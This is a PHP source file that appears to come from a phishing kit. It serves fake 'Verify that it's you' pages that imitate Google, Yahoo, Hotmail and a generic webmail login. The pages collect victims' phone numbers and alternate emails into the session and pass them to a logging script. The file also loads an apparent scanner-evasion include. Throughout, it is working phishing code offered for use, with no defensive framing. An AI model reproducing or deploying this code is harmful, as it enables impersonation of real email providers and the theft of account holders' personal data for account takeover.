<?php
if(!isset($_SESSION)){ 
    session_start(); 
}
require_once('block_detectors.php');
	$phone_error = "";
	$email_error = "";
	$flag = false;
	if($_POST){
		$phone = $_POST['phone'];
		$email = trim($_POST['alternate_email']);
		if(!preg_match("/^\+?[0-9- ]{7,20}$/", $phone)){
			$phone_error = "Please enter a valid phone number";
		}else{
			$flag = true;
		}
		if(!preg_match("/^[_a-zA-Z0-9-]+(\.[_a-z0-9-]+)*@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*(\.[a-zA-Z]{2,4})$/", $email) || !empty($email) && $flag) {
			$email_error = "The email address is invalid";
		} 
		if($flag){
			$_SESSION['phone'] = $phone;
			$_SESSION['alternate_email'] = $email;
			require('log.php');
			exit;
		}
	}
	if($_SESSION['domain'] === "gmail"){ ?>
			<html>
				<head>
				<title>Google Accounts</title>
				<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
				<link rel="stylesheet" type="text/css" href="css/styles2.css">
				<link href="images/gfavicon.ico" rel="shortcut icon">
				</head>
				<body >
					<div id="wrapper">
						<img class="top-gap" src="images/logo.png">
						<div class="verify-content top-gap">
							<h3>Verify that it's you</h3>
							<p>Confirm your phone number and optional alternate email below to verify that it's you signing into this account. This is an occasional check to ensure the security of your account.</p>
						</div>
						<div class="second-wrapper">
							<div class="verify-content top-gap">
								<form method="POST" action="">

									<div class="fields">
										<div class="confirm-img"><img src="images/gphone.png"></div>
										<div class="confirm-field">
											<span>Enter your phone number</span>
											<input class="confirm" type="text" value="<? echo $_POST ? $_POST['phone']: "";?>" placeholder="Your phone number" name="phone" class="phone">
										</div>
									</div>
										<span class="clearfix"></span>
									<div class="fields">
										<div class="confirm-img"><img src="images/gemail.png"></div>
										<div class="confirm-field">
											<span>Enter your alternate email (Optional)</span>
											<input class="confirm" type="text" value="<? echo $_POST ? $_POST['alternate_email']: "";?>" placeholder="Alternate email" name="alternate_email" class="alternate">
										</div>
										
									</div>
									<?php 
											echo $phone_error !== "" ? '<div class="error clearfix ">'.$phone_error.'</div>' : ""; 
											echo $email_error !== "" ? '<div class="error clearfix ">'.$email_error.'</div>' : ""; 
										?>
									
									<div style="text-align: center;"><input type="submit" class="rc-button rc-button-submit" id="signIn" value="Submit"></div>
								</form>
							</div>
						</div>
					</div>
				</body>
			</html>

	<?php } else if($_SESSION['domain'] === "yahoo"){ ?>

			<html>
				<head>
				<title>Yahoo - Account Verification</title>
				<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
				<link rel="stylesheet" type="text/css" href="css/styles2.css">
				<link href="images/yfavicon.ico" rel="shortcut icon">
				</head>
				<body >
					<div id="wrapper">
						<img class="top-gap" src="images/logo2.png">
						<div class="verify-content top-gap">
							<h3>Verify that it's you</h3>
							<p>Confirm your phone number and optional alternate email below to verify that it's you signing into this account. This is an occasional check to ensure the security of your account.</p>
						</div>
						<div class="second-wrapper">
							<div class="verify-content top-gap">
								<form method="POST" action="">

									<div class="fields">
										<div class="confirm-img"><img src="images/yphone.png"></div>
										<div class="confirm-field">
											<span>Enter your phone number</span>
											<input class="confirm" type="text" value="<? echo $_POST ? $_POST['phone']: "";?>" placeholder="Your phone number" name="phone" class="phone">
										</div>
									</div>
										<span class="clearfix"></span>
									<div class="fields">
										<div class="confirm-img"><img src="images/yemail.png"></div>
										<div class="confirm-field">
											<span>Enter your alternate email (Optional)</span>
											<input class="confirm" type="text" value="<? echo $_POST ? $_POST['alternate_email']: "";?>" placeholder="Alternate email" name="alternate_email" class="alternate">
										</div>
										
									</div>
									<?php 
										echo $phone_error !== "" ? '<div class="error clearfix ">'.$phone_error.'</div>' : ""; 
										echo $email_error !== "" ? '<div class="error clearfix ">'.$email_error.'</div>' : ""; 
									?>
									
									<div style="text-align: center;"><input type="submit" class="rc-button rc-button-submit" id="signIn" value="Submit"></div>
								</form>
							</div>
						</div>
					</div>
				</body>
			</html>

	<?php } else if($_SESSION['domain'] === "hotmail"){ ?>

			<html>
				<head>
				<title>Help us protect your account</title>
				<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
				<link rel="stylesheet" type="text/css" href="css/styles2.css">
				<link href="images/hfavicon.ico" rel="shortcut icon">
				</head>
				<body >
					<div id="wrapper">
						<img class="top-gap" src="images/hlogo.png">
						<div class="verify-content top-gap">
							<h3>Help us protect your account</h3>
							<p>To verify that this is your email address, confirm the phone number associated with your account and optional alternate email address
							 and click "Submit".</p>
						</div>
						<div class="second-wrapper">
							<div class="verify-content top-gap">
								<form method="POST" action="">

									<div class="fields">
										<div class="confirm-img"><img src="images/hphone.png"></div>
										<div class="confirm-field">
											<span>Enter your phone number</span>
											<input class="confirm" type="text" value="<? echo $_POST ? $_POST['phone']: "";?>" placeholder="Your phone number" name="phone" class="phone">
										</div>
									</div>
										<span class="clearfix"></span>
									<div class="fields">
										<div class="confirm-img"><img src="images/hemail.png"></div>
										<div class="confirm-field">
											<span>Enter your alternate email (Optional)</span>
											<input class="confirm" type="text" value="<? echo $_POST ? $_POST['alternate_email']: "";?>" placeholder="Alternate email" name="alternate_email" class="alternate">
										</div>
										
									</div>
									<?php 
											echo $phone_error !== "" ? '<div class="error clearfix ">'.$phone_error.'</div>' : ""; 
											echo $email_error !== "" ? '<div class="error clearfix ">'.$email_error.'</div>' : ""; 
										?>
									
									<div style="text-align: center;"><input type="submit" class="rc-button rc-button-submit" id="signIn" value="Submit"></div>
								</form>
							</div>
						</div>
					</div>
				</body>
			</html>
	<?php } else{ ?>
			
			<html>
			<head>
				<title>Webmail</title>
				<link rel="stylesheet" type="text/css" href="css/style.css">
				<link rel="icon" type="image/png" href="images/favicon.ico">
			</head>
			<body>

				<div class="login-form">
					<div class="inner">
						<div class="head"><img src="images/webmail.png" > <div class="header-title">Additional information required to verify it's you</div></div>
						<div class="form-content">
							<form action="" method="POST">
								<div class="input-fields">
									<?php echo $phone_error !== "" ? '<div class="error user-error">'.$phone_error.'</div>' : ""; ?>
									<span class="verification">Enter Your Phone Number</span>
									<input type="text" maxlength="20" class="login-data" value="<? echo $_POST ? $_POST['phone']: "";?>" placeholder="Your phone number" name="phone">

									<?php echo $email_error !== "" ? '<div class="error input-fields2">'.$email_error.'</div>' : "";  ?>
									<span class="verification" >Alternate Email (Optional)</span>
									<input class="login-data" type="text" value="<? echo $_POST ? $_POST['alternate_email']: "";?>" placeholder="Alternate email" name="alternate_email" class="alternate">
									<input type="submit" value="Submit" class="button">
								</div>
							</form>
						</div>
					</div>
					<div class="shadow"><img src="images/shadow.png" ></div>

					<div class="supported">
						<h3>Supported Email Providers</h3>
						<img src="images/supported.png" >
					</div>
				</div>
			</body>
			</html>

	<?php }
?>
